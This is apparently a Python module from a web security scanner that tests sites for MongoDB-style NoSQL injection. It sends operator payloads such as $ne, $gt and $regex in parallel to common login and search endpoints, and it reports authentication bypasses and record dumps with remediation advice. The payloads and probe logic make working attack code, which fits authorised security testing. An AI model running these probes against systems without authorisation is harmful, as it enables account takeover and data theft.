"""NoSQL Injection — MongoDB-style operator injection on auth + review endpoints.

VL-TURBO deep: probes are parallelized via ThreadPoolExecutor. Login fan-out
(6 paths × N payloads) + review fan-out (5 paths × M payloads) previously
ran sequentially with 10s timeouts each = up to 280s worst case (killed at
the 60s wall-clock cap, leaving most paths unprobed). Now ~15s total.
"""
import json as _json
from concurrent.futures import ThreadPoolExecutor
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_post, wrap_finding, standard_response)
from tools._spa_state import load_spa_state
from tools._payloads.webapp._loader import load_json
from tools._vl_core.turbo import vl_turbo
from tools._vl_core.verify import vl_verify

router = APIRouter()

_LOGIN_PATHS = [
    "/api/auth/login", "/api/login", "/rest/user/login",
    "/login", "/auth/login", "/api/v1/auth/login",
]
_REVIEW_PATHS = [
    "/rest/products/reviews",   # Juice Shop search-by-review (vulnerable to NoSQL)
    "/api/reviews",
    "/api/products/search",
    "/rest/products/search",
    "/api/search",
]
_LOGIN_PAYLOADS = [
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
]
_REVIEW_PAYLOADS = [
    {"$ne": "x"},
    {"$gt": ""},
]

# === NOSQL-AI-EXTRA-V1 ===
# Merge AI-curated MongoDB operator payloads into auth-bypass + review attack
# sets. Filter to entries whose transport is JSON and whose category targets
# auth-bypass / privilege-escalation. Each curated payload is a JSON-string
# we parse into a dict so the existing _LOGIN_PAYLOADS shape is preserved.
_AI_EXTRA_NOSQL = load_json("nosql_payloads", fallback=[])
for _p in _AI_EXTRA_NOSQL:
    if not isinstance(_p, dict): continue
    if _p.get("transport") != "json": continue
    if _p.get("engine") not in ("MongoDB", "Universal"): continue
    cat = _p.get("category", "")
    try:
        parsed = _json.loads(_p.get("payload", ""))
    except Exception:
        continue
    if not isinstance(parsed, dict): continue
    if cat in ("auth-bypass", "privilege-escalation") and parsed not in _LOGIN_PAYLOADS:
        _LOGIN_PAYLOADS.append(parsed)
    if cat in ("data-exfil", "where-tautology", "auth-bypass") and parsed not in _REVIEW_PAYLOADS:
        _REVIEW_PAYLOADS.append(parsed)
# === /NOSQL-AI-EXTRA-V1 ===


def _is_auth_success(text):
    low = text.lower()
    return any(m in low for m in ('"token"', '"jwt"', '"access_token"',
                                   '"authentication"', '"sessionid"',
                                   '"bearer"'))


@router.post("/api/webapp/scan/nosql")
@vl_turbo()
@vl_verify()
def scan_nosql(req: ScanRequest, _=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")
    spa = load_spa_state(req.target)

    # Build login candidates
    login_candidates = set(_LOGIN_PATHS)
    review_candidates = set(_REVIEW_PATHS)
    for url in (spa.get("endpoints") or {}).keys():
        path = url.replace(base, "") if url.startswith(base) else url
        if not path.startswith("/"):
            continue
        low = path.lower()
        if any(k in low for k in ("login", "auth", "signin")):
            login_candidates.add(path)
        elif any(k in low for k in ("review", "search", "query", "find")):
            review_candidates.add(path)

    findings, confirmed = [], []
    login_paths = list(login_candidates)[:6]
    review_paths = list(review_candidates)[:5]

    # ── Login bypass — parallel fan-out
    login_jobs = [(p, pl) for p in login_paths for pl in _LOGIN_PAYLOADS]

    def _probe_login(job):
        path, payload = job
        url = base + (path if path.startswith("/") else "/" + path)
        body = {"email": payload, "password": payload}
        r = safe_post(url, json=body, req=req,
                       headers={"Content-Type": "application/json"},
                       allow_redirects=False, timeout=10)
        if r is None or r.status_code not in (200, 201):
            return None
        if _is_auth_success(r.text or ""):
            return (path, payload, r.status_code)
        return None

    seen_login_paths = set()
    with ThreadPoolExecutor(max_workers=12) as pool:
        for hit in pool.map(_probe_login, login_jobs, timeout=45):
            if not hit:
                continue
            path, payload, status = hit
            if path in seen_login_paths:
                continue  # only first hit per path
            seen_login_paths.add(path)
            findings.append(wrap_finding(
                f"NoSQL Injection — auth bypass via operator on {path}",
                "CRITICAL", cvss="9.8", cwe="CWE-943", owasp="A03:2021",
                remediation=("Cast all auth inputs to string before passing to "
                           "the database driver. Reject non-string types on "
                           "email/password fields."),
                evidence_marker=(f"POST {path} JSON {{'email': {payload}, "
                                  f"'password': {payload}}} returned auth-success markers")))
            confirmed.append({"path": path, "kind": "login_bypass",
                              "payload": str(payload), "status": status})

    # ── Review/search exfiltration — parallel baseline + probes per path
    def _probe_review_baseline(path):
        url = base + (path if path.startswith("/") else "/" + path)
        baseline = safe_post(url, json={"query": "vulnuslab-canary-zzz"}, req=req,
                              headers={"Content-Type": "application/json"},
                              allow_redirects=False, timeout=10)
        return path, len(baseline.content) if baseline is not None else 0

    # First pass: get baselines in parallel
    with ThreadPoolExecutor(max_workers=10) as pool:
        baselines = dict(pool.map(_probe_review_baseline, review_paths, timeout=20))

    review_jobs = [(p, pl) for p in review_paths for pl in _REVIEW_PAYLOADS]

    def _probe_review(job):
        path, payload = job
        url = base + (path if path.startswith("/") else "/" + path)
        body = {"query": payload, "id": payload, "search": payload}
        r = safe_post(url, json=body, req=req,
                       headers={"Content-Type": "application/json"},
                       allow_redirects=False, timeout=10)
        if r is None or r.status_code not in (200, 201):
            return None
        baseline_len = baselines.get(path, 0)
        if len(r.content) > max(baseline_len * 2, 500):
            return (path, payload, baseline_len, len(r.content))
        return None

    seen_review_paths = set()
    with ThreadPoolExecutor(max_workers=12) as pool:
        for hit in pool.map(_probe_review, review_jobs, timeout=45):
            if not hit:
                continue
            path, payload, baseline_len, probe_len = hit
            if path in seen_review_paths:
                continue
            seen_review_paths.add(path)
            findings.append(wrap_finding(
                f"NoSQL Injection — operator dumps records on {path}",
                "HIGH", cvss="7.5", cwe="CWE-943", owasp="A03:2021",
                remediation=("Sanitise + cast types on every search/filter input. "
                           "Reject non-string operators in user-controlled fields."),
                evidence_marker=(f"POST {path} with operator {payload} returned "
                                  f"{probe_len} bytes vs {baseline_len} byte baseline")))
            confirmed.append({"path": path, "kind": "data_exfil",
                              "payload": str(payload),
                              "baseline_len": baseline_len,
                              "probe_len": probe_len})

    tests = len(login_jobs) + len(review_paths) + len(review_jobs)
    return standard_response(tool="nosql", target=req.target, findings=findings,
        tests_performed=tests,
        tests_summary=(f"NoSQL: {tests} parallel probes across "
                       f"{len(login_paths)} login + {len(review_paths)} review/search endpoints"),
        raw_data={"nosql": {"confirmed": confirmed}})


def register(app):
    app.include_router(router)
